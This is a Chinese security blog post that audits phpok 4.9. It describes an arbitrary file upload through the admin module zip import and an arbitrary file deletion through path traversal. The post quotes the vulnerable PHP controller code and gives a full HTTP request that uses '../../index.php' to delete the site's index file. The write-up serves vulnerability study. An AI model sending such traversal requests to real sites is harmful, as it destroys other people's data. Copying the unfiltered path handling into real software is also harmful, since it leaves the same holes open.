<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>phpok 4.9代码审计(每周一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>phpok 4.9代码审计(每周一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-08-05 14:54</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/phpok/">#phpok</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01-前言">0x01 前言</h1>
<p>一放暑假就特别多事情，很多事情都耽误了，看吐司文章看到一篇不错的审计文章，就学习下。</p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<p>环境没什么要求PHPstudy就能搞定，这个要先创建数据库再安装程序的。</p>
<h1 id="0x03-任意文件上传漏洞">0x03 任意文件上传漏洞</h1>
<h2 id="漏洞复现">漏洞复现</h2>
<ol>
<li>登录后台，点击模块管理
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/1.png" alt=""></li>
</ol>
<!-- raw HTML omitted -->
<ol start="2">
<li>新建一个测试文件然后压缩
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/2.png" alt=""></li>
<li>然后导入模块
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/3.png" alt="">
可以看到已经上传到了/data/cache/的目录下面了：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/4.png" alt=""></li>
<li>访问文件
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/5.png" alt=""></li>
</ol>
<h2 id="漏洞分析">漏洞分析</h2>
<p>漏洞代码在<code>framework/admin/modulec_control.php</code> 642行。
大家可以详细的分析这个流程，主要漏洞的代码是
<code>$this-&gt;lib('phpzip')-&gt;unzip($this-&gt;dir_root.$zipfile,$this-&gt;dir_root.'data/cache/');</code>
没有做任何的过滤，直接把zip原样解压缩到/data/cache/的目录下面。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#e6db74">/**
</span><span style="color:#e6db74">	 * 模块导入
</span><span style="color:#e6db74">	 * @变量 zipfile 指定的ZIP文件地址
</span><span style="color:#e6db74">	**/</span>
	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">import_f</span>()
	{
		$zipfile <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;zipfile&#39;</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$zipfile){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;form&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cssjs</span>(<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;form_type&#39;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#39;upload&#39;</span>));
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addjs</span>(<span style="color:#e6db74">&#39;js/webuploader/admin.upload.js&#39;</span>);
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">view</span>(<span style="color:#e6db74">&#39;module_import&#39;</span>);
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strpos</span>($zipfile,<span style="color:#e6db74">&#39;..&#39;</span>) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;不支持带..上级路径&#39;</span>));
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span>$zipfile)){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;ZIP文件不存在&#39;</span>));
		}
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;phpzip&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">unzip</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span>$zipfile,$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;data/cache/&#39;</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;data/cache/module.xml&#39;</span>)){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;导入模块失败，请检查解压缩是否成功&#39;</span>));
		}
		$rs <span style="color:#f92672">=</span> $info <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;xml&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">read</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;data/cache/module.xml&#39;</span>,<span style="color:#66d9ef">true</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$rs){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;XML内容解析异常&#39;</span>));
		}
		$tmp <span style="color:#f92672">=</span> $rs;
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($tmp[<span style="color:#e6db74">&#39;_fields&#39;</span>])){
			<span style="color:#a6e22e">unset</span>($tmp[<span style="color:#e6db74">&#39;_fields&#39;</span>]);
		}
		
		$insert_id <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">save</span>($tmp);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$insert_id){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;模块导入失败，保存模块基本信息错误&#39;</span>));
		}
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">create_tbl</span>($insert_id);
		$tbl_exists <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">chk_tbl_exists</span>($insert_id,$tmp[<span style="color:#e6db74">&#39;mtype&#39;</span>]);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$tbl_exists){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">delete</span>($insert_id);
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;创建模块表失败&#39;</span>));
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($rs[<span style="color:#e6db74">&#39;_fields&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $rs[<span style="color:#e6db74">&#39;_fields&#39;</span>]){
			<span style="color:#66d9ef">foreach</span>($rs[<span style="color:#e6db74">&#39;_fields&#39;</span>] <span style="color:#66d9ef">as</span> $key<span style="color:#f92672">=&gt;</span>$value){
				<span style="color:#66d9ef">if</span>($value[<span style="color:#e6db74">&#39;ext&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">is_array</span>($value[<span style="color:#e6db74">&#39;ext&#39;</span>])){
					$value[<span style="color:#e6db74">&#39;ext&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">serialize</span>($value[<span style="color:#e6db74">&#39;ext&#39;</span>]);
				}
				$value[<span style="color:#e6db74">&#39;module_id&#39;</span>] <span style="color:#f92672">=</span> $insert_id;
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fields_save</span>($value);
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;module&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">create_fields</span>($value[<span style="color:#e6db74">&#39;id&#39;</span>]);
			}
		}
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;file&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rm</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_cache</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;module.xml&#39;</span>);
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;file&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rm</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span>$zipfile);
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">success</span>();
	}
}
</code></pre></div><h1 id="0x04-任意文件删除">0x04 任意文件删除</h1>
<h2 id="漏洞复现-1">漏洞复现</h2>
<ol>
<li>在设置-&gt;风格管理
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/6.png" alt=""></li>
<li>点击文件管理
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/7.png" alt=""></li>
<li>随便删除一个文件，点击抓包
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/8.png" alt=""></li>
<li>改包发包，删除index.php文件</li>
</ol>
<pre><code>GET /admin.php?c=tpl&amp;f=delfile&amp;id=1&amp;folder=%2F&amp;title=../../index.php&amp;_=1533453756715 HTTP/1.1
Host: sb.com
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
request_type: ajax
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Referer: http://sb.com/admin.php?c=tpl&amp;f=list&amp;id=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: hd_sid=aZY7Qf; hd_auth=f0c7B2JXp7hhumOhqeqELbZ5FJA3C%2FW2AKt4di3duYf1l5T%2BbkCMPFkWus2WrHfUg2Z8np8oM4VygPGWolgu; PHPSESSION=tlcm8fq4vhio5gkh5l1f5156i3
Connection: close
</code></pre><ol start="5">
<li>文件已删除，网站主页不能访问
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpok/9.png" alt=""></li>
</ol>
<h2 id="漏洞分析-1">漏洞分析</h2>
<p>漏洞文件位置在于<code>framework/admin/tpl_control.php</code>的297行
$file虽然是由几个参数拼接而成的，但是加上../../就可以回到任何位置，造成了任意文件删除的漏洞。</p>
<p><code>$file = $this-&gt;dir_root.&quot;tpl/&quot;.$rs[&quot;folder&quot;].$folder.$title;</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#e6db74">/**
</span><span style="color:#e6db74">	 * 删除文件（夹）
</span><span style="color:#e6db74">	**/</span>
	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">delfile_f</span>()
	{
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">popedom</span>[<span style="color:#e6db74">&#34;filelist&#34;</span>]){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;您没有权限执行此操作&#39;</span>));
		}
		$id <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;id&#34;</span>,<span style="color:#e6db74">&#34;int&#34;</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$id){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;未指定风格ID&#39;</span>));
		}
		$rs <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;tpl&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get_one</span>($id);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$rs){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;风格信息不存在&#39;</span>));
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$rs[<span style="color:#e6db74">&#34;folder&#34;</span>]){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;未设置风格文件夹&#39;</span>));
		}
		$folder <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;folder&#34;</span>);
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$folder){
			$folder <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>;
		}
		$title <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;title&#34;</span>);
		$file <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">dir_root</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;tpl/&#34;</span><span style="color:#f92672">.</span>$rs[<span style="color:#e6db74">&#34;folder&#34;</span>]<span style="color:#f92672">.</span>$folder<span style="color:#f92672">.</span>$title;
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($file)){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#a6e22e">P_Lang</span>(<span style="color:#e6db74">&#39;文件（夹）不存在&#39;</span>));
		}
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_dir</span>($file)){
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;file&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rm</span>($file,<span style="color:#e6db74">&#34;folder&#34;</span>);
		}<span style="color:#66d9ef">else</span>{
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lib</span>(<span style="color:#e6db74">&#39;file&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rm</span>($file);
		}
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">success</span>();
	}
</code></pre></div><h1 id="0x05-结束">0x05 结束</h1>
<p>虽然说这个漏洞很简单，但是这个程序能申请CVE，这也提醒我们无论是什么大程序都会存在很明显的漏洞。</p>
<h1 id="0x06-参考">0x06 参考</h1>
<p>程序下载：https://www.lanzous.com/i1ksjkd
<a href="https://www.t00ls.net/viewthread.php?tid=46682">https://www.t00ls.net/viewthread.php?tid=46682</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba">
                            0x02 环境搭建
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e">
                            0x03 任意文件上传漏洞
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0">
                            漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90">
                            漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%88%a0%e9%99%a4">
                            0x04 任意文件删除
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1">
                            漏洞复现
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1">
                            漏洞分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e7%bb%93%e6%9d%9f">
                            0x05 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-%e5%8f%82%e8%80%83">
                            0x06 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
